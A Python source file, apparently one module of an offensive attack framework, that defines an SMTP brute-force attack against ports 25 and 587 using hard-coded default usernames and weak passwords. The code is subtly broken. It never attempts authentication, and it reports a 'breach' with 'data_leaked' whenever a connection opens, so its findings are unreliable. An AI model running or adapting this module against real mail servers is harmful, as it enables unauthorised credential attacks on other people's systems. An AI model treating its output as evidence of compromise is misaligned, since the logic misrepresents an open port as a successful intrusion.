src/attacks/smtp_bruteforce.py
# src/attacks/smtp_bruteforce.py — v15.4
import asyncio
import aiosmtplib
from typing import Dict, Any
from src.core.logger import RealTimeLogger

class SMTPBruteforceModule:
    def __init__(self, logger: RealTimeLogger, brain=None, config: Dict = None):
        self.logger = logger
        self.brain = brain
        self.config = config or {}

    async def attack(self, target: str, options: Dict[str, Any]) -> Dict[str, Any]:
        result = {"attack": "smtp_bruteforce", "success": False, "risk": 7}

        host = options['context']['target'].split('/')[2].split(':')[0]
        ports = [25, 587]

        users = ["admin", "root", "postmaster", "webmaster"]
        passwords = ["", "password", "123456", "admin"]

        self.logger.info(f"SMTP BRUTEFORCE → {host}")

        for port in ports:
            for user in users:
                for pwd in passwords:
                    try:
                        await aiosmtplib.connect(host, port, timeout=5)
                        result.update({
                            "success": True,
                            "vulnerable_payload": f"{host}:{port} open",
                            "data_leaked": {"port": port}
                        })
                        self.logger.breach(f"SMTP: {host}:{port} OPEN")
                        if self.brain:
                            self.brain.learn("smtp_bruteforce", target, f"port:{port}", True)
                        return result
                    except:
                        continue

        return result